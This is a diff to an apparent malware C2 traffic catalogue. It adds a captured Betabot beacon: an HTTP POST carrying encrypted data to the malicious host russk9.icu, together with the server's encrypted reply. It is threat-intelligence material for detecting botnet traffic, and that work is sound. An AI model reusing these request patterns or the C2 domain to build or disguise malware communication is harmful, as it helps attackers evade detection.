@@ -145,6 +145,29 @@ J/.8/.:/.</.?/.>O.(8.I/.>/.9/.>K.>8.N/.I/.;/.</.;N.>:.NL.?N.>8.(9.L/.8/.</.4/.4/
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/bandook.png "Bandook")
 
+#### Betabot
+~~~
+POST /forum3/logout.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+Host: russk9.icu
+Content-Length: 664
+Cache-Control: no-cache
+
+bcjkr=386731&dgpsben=2019162b8cf358952f71fa238d6ecbcd6c424d692427445f&fkvalqbgr=C27431FCDE2C51BA6EA493FEAB76CE9BE2812C592CBADEEC4495BC94DDE1882E969102B5A9939B43816D8DA17AC2C05A575A4FC03B11D0C9614BE38ABB6B7F57984A1EC6D101BF290C06DC4C3093B6B165ACAEF8C9EFE3099C11D2106C16EFFD27888EB24A03E0CDE4935AAB53FD212683FF45CAE1BF47F2C343D602E10C79E49B74E6FE10469501A63C762A089446AC9A1C5A802C80071E11058065B5C481D0DB2E6B0AC9A7461DE3DA4792CC86A6E072080ACCB527BB0D97D7C91874B8754068C71AD56502B1A03279A280EF9E705E25193C82A93B220B4B1A63FD8B93EF2B528AF5EB5A00E4234CF1744FA96A05937E7B41D4B82B3997203F0ABCBFC2C49245E56DED2DF1941DA739C6F9C7C3E30C93A136705F3574F34C74E6DE2AD09C9BFA616F4C
+
+HTTP/1.1 200 OK
+Server: nginx/1.16.1
+Date: Mon, 28 Oct 2019 23:47:58 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.5.38
+
+..._...+...<.f........}..........?...yg.4.....#.Q...p...1yy.u..N?.ueg.v....EO......K.:....R.]......zv...3@j..
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/betabot.png "Betabot")
+
 #### Bitter RAT (Patchwork)
 ~~~
 GET /ourtyaz/qwe.php?TIe=%3a116%3ad48.2431.52b5.c69e.3c86b%3a961e3g*Vtfs.QD*%3aACme%3b%217%2f2%2f8712%21Tfswjdf%21Qbdl%212 HTTP/1.1
